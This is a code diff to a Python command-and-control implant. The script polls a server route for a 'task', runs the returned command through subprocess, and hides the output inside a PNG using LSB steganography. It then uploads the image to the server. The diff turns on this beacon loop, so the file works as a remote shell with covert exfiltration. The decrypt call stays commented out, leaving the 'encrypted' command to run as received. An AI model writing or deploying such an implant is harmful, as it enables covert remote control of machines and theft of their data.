@@ -6,7 +6,6 @@ import subprocess
 import time
 
 
-
 url = "http://localhost:80/"
 routes = {
     0 : url + "task", 
@@ -31,17 +30,6 @@ def mod_img(msg):
     #print("[*] Revealed from image:")
     #print(lsb.reveal(f"{path}{file_name}-final.png"))
     return f"{path}{file_name}-final.png" 
-
-"""
-def img_in_img(cover, path_to_img): 
-    cover_img = Image.open(cover)
-    cover_img.resize((50000, 1000))
-    with open(path_to_img, "rb") as img_file:
-        print(len(img_file.read())) 
-        altered_img = stepic.encode(cover_img, img_file.read())
-    print(type(altered_img))
-"""
-
 
 #Execute command 
 def exec(cmd): 
@@ -92,23 +80,22 @@ def init():
 def parse_json(response): 
     res_json = response.json()
     cmd = ""
-    if res_json["msg"] == None: 
+    if res_json["task"] == None: 
         print("[-] Error in parsing JSON.")
         cmd = "echo 0" #just doing this to handle error case 
     else:
-        cmd = res_json["msg"]
+        cmd = res_json["task"]
     return cmd
 
 if __name__ == '__main__':
     init()
     while True: 
         try: 
-            #Note: comment out the first three lines (until cmd = "ls -la") to test steganography functions
-            #response = requests.get(routes[0]) 
-            #encrypted_cmd = parse_json(response) 
-            #cmd = decrypt(encrypted_cmd) 
-            cmd = "ls -la" 
-            output = exec(cmd) 
+            # Note: comment out the first three lines (until cmd = "ls -la") to test steganography functions
+            response = requests.get(routes[0]) 
+            encrypted_cmd = parse_json(response) 
+            # cmd = decrypt(encrypted_cmd) 
+            output = exec(encrypted_cmd) 
             if output != "": 
                 obf_img = mod_img(output)
                 requests.post(routes[1], files={"file": open(obf_img,'rb')})
